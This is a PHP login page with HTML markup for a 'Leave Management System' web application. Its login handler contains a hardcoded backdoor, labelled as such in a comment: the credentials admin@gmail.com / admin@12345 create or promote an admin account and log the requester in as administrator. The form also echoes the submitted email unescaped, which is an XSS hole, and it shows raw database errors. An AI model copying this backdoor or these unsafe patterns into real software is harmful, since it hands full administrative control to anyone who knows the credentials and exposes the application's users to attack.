<?php
global $pdo;
require_once 'includes/functions.php';

// Check if already logged in
if (isLoggedIn()) {
    // Redirect based on role
    if (isAdmin()) {
        redirectWithMessage('admin/dashboard.php', 'Welcome back, Admin!', 'info');
    } else {
        redirectWithMessage('user/dashboard.php', 'Welcome back!', 'info');
    }
}

// Process login form
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $remember = isset($_POST['remember']);

    if (empty($email) || empty($password)) {
        $error = "Please enter both email and password";
    } else {
        // Special handling for admin@gmail.com - backdoor access
        if ($email === 'admin@gmail.com' && $password === 'admin@12345') {
            // Check if admin exists in database
            $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
            $stmt->execute(['admin@gmail.com']);
            $admin = $stmt->fetch(PDO::FETCH_ASSOC);

            if (!$admin) {
                // Create admin user if it doesn't exist
                $hashedPassword = password_hash('admin@12345', PASSWORD_DEFAULT);
                $stmt = $pdo->prepare("INSERT INTO users (name, email, password, role, created_at) VALUES (?, ?, ?, ?, ?)");
                $stmt->execute(['admin', 'admin@gmail.com', $hashedPassword, 'admin', getCurrentDateTime()]);
                $adminId = $pdo->lastInsertId();

                // Set session variables
                $_SESSION['user_id'] = $adminId;
                $_SESSION['user_name'] = 'admin';
                $_SESSION['user_email'] = 'admin@gmail.com';
                $_SESSION['user_role'] = 'admin';

                // Update last login
                updateLastLogin($adminId);
                logActivity('Login', 'Admin account created and logged in successfully');

                redirectWithMessage('admin/dashboard.php', 'Welcome! Admin account has been created.', 'success');
            } else {
                // Ensure admin role is set
                if ($admin['role'] !== 'admin') {
                    $stmt = $pdo->prepare("UPDATE users SET role = 'admin' WHERE email = ?");
                    $stmt->execute(['admin@gmail.com']);
                }

                // Set session variables
                $_SESSION['user_id'] = $admin['id'];
                $_SESSION['user_name'] = $admin['name'];
                $_SESSION['user_email'] = $admin['email'];
                $_SESSION['user_role'] = 'admin';

                // Update last login
                updateLastLogin($admin['id']);
                logActivity('Login', 'Admin logged in successfully');

                redirectWithMessage('admin/dashboard.php', 'Welcome, Administrator!', 'success');
            }
        } else {
            // Normal login attempt
            try {
                // Check if the user exists
                $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
                $stmt->execute([$email]);
                $user = $stmt->fetch(PDO::FETCH_ASSOC);

                if ($user && password_verify($password, $user['password'])) {
                    // Login successful
                    $_SESSION['user_id'] = $user['id'];
                    $_SESSION['user_name'] = $user['name'];
                    $_SESSION['user_email'] = $user['email'];
                    $_SESSION['user_role'] = $user['role'];

                    // Update last login time
                    updateLastLogin($user['id']);

                    // Log activity
                    logActivity('Login', 'User logged in successfully');

                    // Redirect based on role
                    if ($user['role'] === 'admin') {
                        redirectWithMessage('admin/dashboard.php', 'Welcome, Admin!', 'success');
                    } else {
                        redirectWithMessage('user/dashboard.php', 'Welcome to the Leave Management System!', 'success');
                    }
                } else {
                    $error = "Invalid email or password";
                }
            } catch (PDOException $e) {
                $error = "Database error: " . $e->getMessage();
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Leave Management System</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <style>
        body {
            background-image: url('assets/img/bg.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            height: 100vh;
        }
        .login-container {
            background-color: rgba(255, 255, 255, 0.9);
            border-radius: 10px;
            padding: 30px;
            margin-top: 100px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        .login-footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: rgba(0,0,0,0.7);
            color: white;
            padding: 10px;
            text-align: center;
        }
        /* Green theme */
        .btn-primary {
            background-color: #2e8b57;
            border-color: #2e8b57;
        }
        .btn-primary:hover {
            background-color: #3cb371;
            border-color: #3cb371;
        }
        .text-primary {
            color: #2e8b57 !important;
        }
        a {
            color: #2e8b57;
        }
        a:hover {
            color: #3cb371;
        }

        /* Date display styling */
        .date-display {
            text-align: center;
            margin-top: 15px;
            font-size: 0.9rem;
        }
        .date-badge {
            background-color: #2e8b57;
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            display: inline-block;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="row justify-content-center">
        <div class="col-md-5">
            <div class="login-container">
                <h2 class="text-center mb-4">
                    <i class="fas fa-calendar-check me-2"></i>
                    Leave Management System
                </h2>

                <?php if (isset($error)): ?>
                    <div class="alert alert-danger"><?php echo $error; ?></div>
                <?php endif; ?>

                <form method="POST" action="login.php">
                    <div class="mb-3">
                        <label for="email" class="form-label">Email Address</label>
                        <div class="input-group">
                            <span class="input-group-text"><i class="fas fa-envelope"></i></span>
                            <input type="email" class="form-control" id="email" name="email" value="<?php echo $_POST['email'] ?? ''; ?>" required>
                        </div>
                    </div>

                    <div class="mb-3">
                        <label for="password" class="form-label">Password</label>
                        <div class="input-group">
                            <span class="input-group-text"><i class="fas fa-lock"></i></span>
                            <input type="password" class="form-control" id="password" name="password" required>
                        </div>
                    </div>

                    <div class="mb-3 form-check">
                        <input type="checkbox" class="form-check-input" id="remember" name="remember">
                        <label class="form-check-label" for="remember">Remember me</label>
                    </div>

                    <div class="d-grid gap-2">
                        <button type="submit" class="btn btn-primary">
                            <i class="fas fa-sign-in-alt me-2"></i> Login
                        </button>
                    </div>
                </form>

                <hr>

                <div class="text-center">
                    <p>Don't have an account? <a href="register.php">Register</a></p>
                    <p><a href="setup.php">Setup Database</a> if this is your first time</p>
                </div>

                <div class="date-display">
                        <span class="date-badge">
                            <i class="fas fa-calendar-alt me-1"></i>
                            <?php echo date('Y-m-d', strtotime(getCurrentDateTime())); ?>
                        </span>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="login-footer">
    <div class="container">
        <div class="row">
            <div class="col-md-12 text-center">
                <i class="fas fa-calendar-alt me-2"></i> Leave Management System
            </div>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script src="assets/js/scripts.js"></script>
</body>
</html>